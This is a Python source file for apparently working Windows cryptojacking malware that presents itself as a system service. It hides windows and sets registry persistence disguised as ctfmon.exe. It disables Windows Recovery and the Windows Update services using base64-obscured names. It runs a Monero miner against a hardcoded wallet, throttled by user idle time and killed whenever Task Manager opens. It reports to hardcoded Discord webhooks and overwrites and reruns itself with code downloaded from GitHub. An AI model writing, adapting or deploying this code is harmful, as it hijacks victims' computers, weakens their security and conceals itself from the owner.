import os, sys, subprocess

# --- THE HYDRA ENGINE (WinServices.py v6.3 - INDIVIDUAL WORKERS) ---
# This flag tells Windows: "Do NOT show a console window."
HIDE_WINDOW = 0x08000000 

# --- 0. THE VOICE FIX (BOOTSTRAP) ---
def bootstrap():
    """Ensures the engine has its voice with ZERO windows."""
    try:
        import requests, psutil
    except ImportError:
        work_dir = os.path.dirname(os.path.realpath(sys.executable))
        lib_path = os.path.join(work_dir, "Lib", "site-packages")
        if not os.path.exists(lib_path): os.makedirs(lib_path)
        
        # FIX 1: Hide the Pip Install window
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "psutil", "--target", lib_path], 
                              creationflags=HIDE_WINDOW)
        
        # Restart to recognize the new voice
        os.execv(sys.executable, [sys.executable] + sys.argv)

bootstrap()

# --- NOW WE CAN IMPORT EVERYTHING ---
import time, winreg, base64, argparse, platform, ctypes
import requests, psutil

# --- 1. Identity & Dual Webhook Setup ---
parser = argparse.ArgumentParser()
parser.add_argument("--id", default="svchost")
ID = parser.parse_known_args()[0].id

# CONFIG - YOUR INFO IS LOCKED IN
WEBHOOK_SYS = "https://discord.com/api/webhooks/1505276047342436503/LKZyvldidqNyp4__olrWpISFOnNL7v37EF-hK7Kd6S7j1oDFCCRXd0Z1Owi06w_E-XNl"
WEBHOOK_MINE = "https://discord.com/api/webhooks/1505276346644041899/hXVbSQLRBbDsERLeNlx2BIiZHGZbFFQtzHFH62Qzyzpsy-RYyUed9iCnWkJ3UASkzlOX"
WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
POOL = "pool.supportxmr.com:443"
UPDATE_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"

# Obfuscated Strings
REG_RUN = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
SVC_LIST = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="]
PC_NAME = platform.node()
WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
SELF_PATH = os.path.realpath(__file__)

CONFIG = {
    "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
    "WATCH": "Taskmgr.exe",
    "IDLE_PWR": "90",  # 90% when truly idle
    "NORM_PWR": "25",  # 25% when user is active
    "IDLE_SEC": 300    # 5 minutes of no input = Idle
}

# --- 2. THE TRUE IDLE SENSOR (Windows API) ---
class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

def get_idle_duration():
    """Returns how many seconds since the last mouse/keyboard movement."""
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        return millis / 1000.0
    return 0

def notify(msg, type="sys"):
    hook = WEBHOOK_SYS if type == "sys" else WEBHOOK_MINE
    full_msg = f"**[{PC_NAME} | {ID}]**: {msg}"
    try: requests.post(hook, json={"content": full_msg})
    except: pass

# --- 3. System Sovereignty & Persistence ---
def engage_locks():
    """Persistence, Reset Disable, and Update Lockdown with ZERO windows."""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
        py_path = os.path.join(WORK_DIR, "python", "ctfmon.exe")
        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{py_path}" "{SELF_PATH}" --id {ID}')
        winreg.CloseKey(key)
        notify("Persistence Verified (ctfmon mask active).", "sys")
    except: pass
    
    try:
        subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=HIDE_WINDOW)
        notify("Windows Recovery Environment disabled.", "sys")
    except: pass
    
    try:
        for s in SVC_LIST:
            name = base64.b64decode(s).decode()
            subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True, creationflags=HIDE_WINDOW)
            subprocess.run(["sc", "stop", name], capture_output=True, creationflags=HIDE_WINDOW)
        notify("Windows Updates locked.", "sys")
    except: pass

# --- 4. Auto-Updater ---
def auto_update():
    """Checks GitHub for a newer version and restarts if found."""
    try:
        r = requests.get(UPDATE_URL)
        if r.status_code == 200:
            current_content = open(SELF_PATH, 'r').read()
            if r.text != current_content:
                with open(SELF_PATH, 'w') as f: f.write(r.text)
                notify("Shadow Sync: New version detected. Respawning...", "sys")
                os.execv(sys.executable, [sys.executable, SELF_PATH, "--id", ID])
    except: pass

# --- 5. Smart Throttle & HYDRA RESURRECTION ---
def manage_power():
    """Hides from Taskmgr and toggles 90/25 power based on TRUE IDLE and RESURRECTION."""
    is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
    
    miner_proc = None
    current_power = "0"
    for p in psutil.process_iter(['name', 'exe', 'cmdline']):
        try:
            if p.info['name'] == f"{ID}.exe" and p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
                miner_proc = p
                for arg in p.info['cmdline']:
                    if arg == CONFIG["IDLE_PWR"] or arg == CONFIG["NORM_PWR"]:
                        current_power = arg
                break
        except: continue

    if is_monitored:
        if miner_proc:
            try: 
                miner_proc.terminate()
                notify("Monitoring detected. Vanishing.", "sys")
            except: pass
    else:
        idle_time = get_idle_duration()
        target_pwr = CONFIG["IDLE_PWR"] if idle_time > CONFIG["IDLE_SEC"] else CONFIG["NORM_PWR"]
        
        if not miner_proc or current_power != target_pwr:
            if miner_proc:
                try: miner_proc.terminate()
                except: pass
                
            try:
                # --- THE WORKER FIX ---
                # We append the PC_NAME to the WALLET address so SupportXMR tracks them individually
                worker_id = f"{WALLET}.{PC_NAME}"
                
                subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", worker_id, "--max-cpu-usage", target_pwr, "-k", "--tls"], 
                                 creationflags=HIDE_WINDOW)
                notify(f"Watchdog: Engine Engaged. Power: {target_pwr}% (Worker: {PC_NAME})", "mine")
            except Exception as e:
                notify(f"Engine Failed: {str(e)}", "sys")

def main():
    engage_locks()
    notify("SYSTEM ONLINE (v6.3 - Individual Worker Mode)", "sys")
    last_update = time.time()
    
    while True:
        manage_power()
        if time.time() - last_update > 43200:
            auto_update()
            last_update = time.time()
        time.sleep(10)

if __name__ == "__main__":
    main()
